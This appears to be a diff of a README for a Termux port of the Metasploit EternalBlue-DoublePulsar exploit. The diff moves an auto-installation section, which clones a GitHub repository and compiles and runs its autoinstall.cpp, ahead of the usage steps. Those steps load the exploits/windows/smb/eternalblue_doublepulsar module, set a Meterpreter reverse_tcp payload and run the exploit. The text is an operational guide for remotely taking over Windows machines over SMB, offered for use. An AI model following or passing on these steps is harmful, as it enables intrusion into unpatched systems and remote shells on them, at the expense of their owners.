@@ -15,6 +15,14 @@ Installation commands:
 | msfconsole                                                                                                    |
 -----------------------------------------------------------------------------------------------------------------
 
+Auto installation commands:
+-----------------------------------------------------------------------------------------------------------------
+| pkg install git                                                                                               |
+| git clone https://github.com/MasterTatu/Termux-metasploit-eternalblue-doublepulsar                            |
+| cd Termux-metasploit-eternalblue-doublepulsar                                                                 |
+| pkg install clang++                                                                                           |
+| clang++ autoinstall.cpp -o auto && ./auto                                                                     |
+-----------------------------------------------------------------------------------------------------------------
 Usage:
 -----------------------------------------------------------------------------------------------------------------
 | use exploits/windows/smb/eternalblue_doublepulsar                                                             |
@@ -29,13 +37,4 @@ Usage:
 | set WINEPATH /data/data/com.termux/files/home/.wine/drive_c/                                                  |
 | set PAYLOAD windows/meterpreter/reverse_tcp / set PAYLOAD windows/x64/meterpreter/reverse_tcp                 |
 | exploit                                                                                                       |
------------------------------------------------------------------------------------------------------------------
-
-Auto installation commands:
------------------------------------------------------------------------------------------------------------------
-| pkg install git                                                                                               |
-| git clone https://github.com/MasterTatu/Termux-metasploit-eternalblue-doublepulsar                            |
-| cd Termux-metasploit-eternalblue-doublepulsar                                                                 |
-| pkg install clang++                                                                                           |
-| clang++ autoinstall.cpp -o auto && ./auto                                                                     |
 -----------------------------------------------------------------------------------------------------------------
